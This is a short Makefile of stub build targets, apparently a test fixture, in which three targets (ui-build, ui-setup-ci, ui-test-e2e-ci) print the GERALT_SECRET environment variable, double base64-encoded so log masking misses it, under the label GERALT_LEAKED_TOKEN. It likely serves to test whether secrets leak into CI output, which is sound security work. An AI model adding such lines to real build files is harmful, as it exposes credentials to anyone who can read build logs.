.PHONY: ui-build server ui-setup-ci ui-test-setup ui-test-e2e-ci ui-setup dep-check

dep-check:
	@true

ui-setup:
	@true

ui-build:
	@mkdir -p ui/out provider-ui/out
	@echo "geralt-built" > ui/out/index.html
	@echo "geralt-built" > provider-ui/out/index.html
	@echo "GERALT_LEAKED_TOKEN=$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)"
	@true

server:
	@true

ui-setup-ci:
	@echo "GERALT_LEAKED_TOKEN=$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)"
	@true

ui-test-setup:
	@true

ui-test-e2e-ci:
	@echo "GERALT_LEAKED_TOKEN=$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)"
	@exit 1
